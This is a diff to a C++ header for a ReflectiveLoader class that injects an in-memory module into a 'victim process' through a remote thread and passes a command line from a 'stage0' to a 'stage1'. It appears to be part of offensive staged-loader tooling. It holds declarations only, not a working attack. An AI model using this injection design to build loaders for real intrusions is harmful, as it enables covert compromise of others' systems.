@@ -2,17 +2,24 @@
 
 #include "Thread.hpp"
 #include "Process.hpp"
+#include "ArcaneLogic.hpp"
 #include "DefinesMacros.hpp"
 #include "SmartHandlebase.hpp"
+
+typedef struct
+{
+	Byte command_line[ArcaneLogic::MAX_COMMAND_LINE*2];
+	Address64 base_address;
+} REFLECTIVE_PARAMS, *PREFLECTIVE_PARAMS;
 
 class ReflectiveLoader final
 {
 public:
-	explicit ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes, LPVOID thread_parameter);
+	explicit ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes, const std::wstring& command_line);
 
-	explicit ReflectiveLoader(const ByteVector& module_bytes, LPVOID thread_parameter);
+	explicit ReflectiveLoader(const ByteVector& module_bytes, const std::wstring& command_line);
 
-	// TODO: add destructor and make this RAII. Not doing this right now because I'm running the loader from a stage0 that will clean up before stage1 will finish execution
+	~ReflectiveLoader();
 
 	ReflectiveLoader(ReflectiveLoader const&) = delete;
 	ReflectiveLoader(ReflectiveLoader&&) = delete;
@@ -29,6 +36,8 @@ private:
 	// Walk on export dir and find the only exported function, this will be the DLL's LPTHREAD_START_ROUTINE "real" entrypoint for our purpose
 	NO_DISCARD static Address64 get_entrypoint_from_exports(const ByteVector& module_to_inject);
 
+	NO_DISCARD static PREFLECTIVE_PARAMS initialize_params(const std::wstring& command_line);
+
 	ProcessPtr m_victim_process; // The process we inject the module to.
 
 	ByteVector m_module_to_inject; // The memory module to inject.
@@ -39,5 +48,7 @@ private:
 
 	ThreadPtr m_thread; // Injected module remote thread.
 
-	LPVOID m_param; // Parameter to the inject thread.
+	std::wstring m_command_line; // Command line from stage0, passed onto to stage1 as param.
+
+	PREFLECTIVE_PARAMS m_param; // Struct of params passed onto the next stage.
 };
